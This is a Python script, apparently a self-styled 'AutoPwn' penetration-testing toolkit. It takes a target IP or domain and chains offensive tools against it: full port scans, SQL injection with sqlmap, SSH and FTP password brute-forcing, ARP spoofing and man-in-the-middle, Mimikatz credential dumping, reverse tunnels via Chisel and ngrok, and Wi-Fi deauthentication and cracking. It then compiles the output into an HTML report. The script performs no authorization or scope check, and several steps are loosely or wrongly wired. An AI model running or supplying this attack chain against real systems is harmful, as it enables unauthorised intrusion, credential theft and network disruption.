import os
import subprocess
from datetime import datetime

def print_banner():
    banner = r"""
     ________              __               _______       __            
    |  ____\ \            / /              |__   __|     /_/            
    | |__   \ \  ___  ___| |_ _ __ ___  _ __ | | ___  ___ _  __ _ _ __  
    |  __|   > >/ _ \/ __| __| '__/ _ \| '_ \| |/ _ \/ __| |/ _` | '_ \ 
    | |____ / /|  __/ (__| |_| | | (_) | |_) | |  __/ (__| | (_| | | | |
    |______/_/  \___|\___|\__|_|  \___/| .__/|_|\___|\___|_|\__,_|_| |_|
                                      | |                               
                                      |_|       GhostFox - AutoPwn v1.0
    """
    print(banner)

TARGET = input("Enter target IP/domain: ").strip()
IS_DOMAIN = '.' in TARGET
OUTPUT_DIR = f"reports/{TARGET.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
os.makedirs(OUTPUT_DIR, exist_ok=True)

def run_cmd(name, cmd):
    print(f"[+] Running {name}")
    with open(f"{OUTPUT_DIR}/{name.replace(' ', '_')}.txt", "w") as f:
        subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL)

# 1. RECONNAISSANCE

def active_recon():
    print("\n=== ACTIVE RECONNAISSANCE ===")
    run_cmd("Nmap_Full_Port_Scan", ["nmap", "-sS", "-Pn", "-T4", "-p-", TARGET])
    run_cmd("Masscan_Fast_Scan", ["masscan", "-p1-65535", TARGET, "--rate", "10000"])
    run_cmd("ARP_Scan_Local", ["arp-scan", "-l"])

def passive_recon():
    print("\n=== PASSIVE RECONNAISSANCE ===")
    if IS_DOMAIN:
        run_cmd("theHarvester_Emails_Subdomains", ["theHarvester", "-d", TARGET, "-b", "all"])
        run_cmd("Amass_Subdomain_Enumeration", ["amass", "enum", "-d", TARGET])
        run_cmd("Shodan_Exposed_Services", ["shodan", "host", TARGET])
        run_cmd("WHOIS_Domain_Info", ["whois", TARGET])
        run_cmd("DNSenum_Recon", ["dnsenum", TARGET])
        run_cmd("NSLookup", ["nslookup", TARGET])
        run_cmd("Dig_Query", ["dig", TARGET])

# 2. SCANNING & ENUMERATION

def scanning_and_enum():
    print("\n=== SCANNING & ENUMERATION ===")
    run_cmd("Nikto_Web_Vuln_Scan", ["nikto", "-h", TARGET])
    run_cmd("Dirb_Directory_Brute", ["dirb", f"http://{TARGET}"])
    run_cmd("Enum4linux_SMB_Enum", ["enum4linux", "-a", TARGET])
    run_cmd("SMBClient_Share_Check", ["smbclient", f"//{TARGET}/", "-L", "-N"])
    run_cmd("RPCClient_RPC_Scan", ["rpcclient", "-U", "", f"{TARGET}"])
    run_cmd("LDAPsearch_AD_Enum", ["ldapsearch", "-x", "-h", TARGET])
    run_cmd("SharpHound_AD_Collector", ["sharphound", "-c", "All"])

# 3. EXPLOITATION

def exploitation():
    print("\n=== EXPLOITATION ===")
    run_cmd("Searchsploit_Public_Exploit_DB", ["searchsploit", TARGET])
    run_cmd("SQLmap_SQLi", ["sqlmap", "-u", f"http://{TARGET}", "--batch"])
    run_cmd("Hydra_SSH_Brute", ["hydra", "-L", "users.txt", "-P", "pass.txt", f"{TARGET}", "ssh"])
    run_cmd("Medusa_SSH_Brute", ["medusa", "-h", TARGET, "-U", "users.txt", "-P", "pass.txt", "-M", "ssh"])
    run_cmd("Responder_NetSpoofing", ["responder", "-I", "eth0"])
    run_cmd("Bettercap_MITM", ["bettercap", "-iface", "eth0"])
    run_cmd("Ettercap_ArpSpoof", ["ettercap", "-T", "-q", "-i", "eth0", "-M", "arp:remote", f"//{TARGET}//"])

# 4. POST-EXPLOITATION

def post_exploitation():
    print("\n=== POST-EXPLOITATION ===")
    run_cmd("Mimikatz_Credential_Dump", ["mimikatz"])
    run_cmd("PowerView_AD_Enum", ["powershell", "-ep", "bypass", "-file", "PowerView.ps1"])
    run_cmd("Chisel_Port_Forwarding", ["chisel", "server", "-p", "8000", "--reverse"])
    run_cmd("Ngrok_TCP_Tunnel", ["ngrok", "tcp", "4444"])

# 5. WIRELESS ATTACKS

def wireless_attacks():
    print("\n=== WIRELESS ATTACKS ===")
    run_cmd("Aircrack_Password_Crack", ["aircrack-ng", "capture.cap"])
    run_cmd("Wifite_Auto_WEP_WPA", ["wifite", "--timeout", "30"])
    run_cmd("Fluxion_Social_Engineering", ["bash", "fluxion.sh"])
    run_cmd("MDK4_Deauth", ["mdk4", "wlan0mon", "a"])

# AUTOPWN MODE

def autopwn():
    print("\n=== AUTOPWN MODE ===")
    run_cmd("Nmap_Aggressive_Scan", ["nmap", "-A", "-T4", TARGET])
    run_cmd("SQLmap_Auto_SQLi", ["sqlmap", "-u", f"http://{TARGET}", "--batch", "--random-agent"])
    run_cmd("Hydra_Quick_ftp", ["hydra", "-l", "admin", "-P", "rockyou.txt", f"{TARGET}", "ftp"])
    run_cmd("Dirb_Common_Paths", ["dirb", f"http://{TARGET}", "/usr/share/dirb/wordlists/common.txt"])
    run_cmd("Nikto_Auto_Scan", ["nikto", "-host", TARGET])

# 6. REPORT GENERATION

def generate_report():
    print("\n[*] Generating HTML Report...")
    report = f"{OUTPUT_DIR}/report.html"
    with open(report, "w") as f:
        f.write("<html><head><style>body{font-family:monospace;}h2{color:#008000;}pre{background:#f0f0f0;padding:10px;}</style></head><body>")
        for file in sorted(os.listdir(OUTPUT_DIR)):
            if file.endswith(".txt"):
                f.write(f"<h2>{file.replace('_', ' ').replace('.txt', '')}</h2><pre>")
                with open(f"{OUTPUT_DIR}/{file}") as content:
                    f.write(content.read())
                f.write("</pre>")
        f.write("</body></html>")
    print(f"[✓] Report saved to: {report}")

# MAIN

def main():
    print_banner()
    print("[*] Starting Organized Penetration Testing Toolkit...\n")

    mode = input("Select mode:\n[1] Full Scan\n[2] AutoPwn (Aggressive Quick Test)\n> ")

    if mode == "1":
        active_recon()
        passive_recon()
        scanning_and_enum()
        exploitation()
        post_exploitation()
        wireless_attacks()
    elif mode == "2":
        autopwn()

    generate_report()
    print("\n[*] All phases completed successfully.")

if __name__ == "__main__":
    main()
